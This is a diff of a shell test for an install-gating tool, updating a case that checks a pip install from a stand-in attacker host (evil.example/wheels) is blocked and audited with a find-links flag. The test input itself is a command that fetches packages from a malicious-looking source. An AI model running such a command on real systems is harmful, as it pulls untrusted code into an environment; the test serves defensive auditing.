@@ -4642,7 +4642,9 @@ case_pip_cumulative_sources_all_reach_audit() {
   # operator can trust the specific location (delta-5 finding 3.2).
   SAFE_INSTALL_TEST_SCRIPT='pip install --find-links https://evil.example/wheels --index-url https://pypi.org/simple blockme==1.0.0' run_zsh
   assert_status 104 "$FUNCNAME" || return
-  assert_log_contains $'AUDIT\tpackage-audit\tblockme@1.0.0\t--ecosystem\tpython\t--gate\tinstall\t--op\tinstall\t--registry\thttps://evil.example/wheels https://pypi.org/simple' "$FUNCNAME" || return
+  # The find-links selector is also flagged for the private-registry lane,
+  # which cannot probe a flat file page for a namesake (round-1 P2).
+  assert_log_contains $'AUDIT\tpackage-audit\tblockme@1.0.0\t--ecosystem\tpython\t--gate\tinstall\t--op\tinstall\t--registry\thttps://evil.example/wheels https://pypi.org/simple\t--find-links-selected' "$FUNCNAME" || return
   pass "$FUNCNAME"
 }
 
